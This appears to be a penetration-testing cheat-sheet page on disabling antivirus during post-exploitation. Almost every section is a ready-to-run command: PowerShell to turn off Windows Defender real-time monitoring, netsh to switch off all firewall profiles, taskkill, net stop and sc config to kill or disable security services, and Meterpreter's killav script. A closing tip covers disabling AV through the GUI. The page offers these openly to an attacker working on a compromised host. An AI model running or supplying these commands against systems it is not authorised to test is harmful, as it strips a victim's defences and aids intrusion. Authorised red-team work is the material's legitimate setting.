---
description: >-
  Commands to disable antivirus to make post exploitation eaiser. Please note
  that these should not be considered OPSEC safe.
---

# Disable Antivirus

## Disable real-time monitoring for Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Disable Windows Firewall

```powershell
netsh advfirewall set allprofiles state off
```

## Manually Disable Antivirus

```powershell
Taskkill /F /IM avprocess.exe
```

## Stop an Antivirus Service

```powershell
net stop “service name”
```

## Disable a Windows Service

```powershell
sc config "service name" start= disabled
```

## Meterpreter Killav

Meterpreter has a built-in script that will attempt to kill any antivirus identified on the device. I've had mixed results with this but if you're not trying to be quiet then this is sometimes an easy win:

```bash
run killav
```

## Disable AntiVirus via the GUI

I haven't seen this in quite a bit. However, non-administrative users are sometimes able to disable the antivirus running on the host via a GUI interface. If the target has one of these then you can either right click the icon in the task bar and disable it or manually open the GUI and disable it in settings.
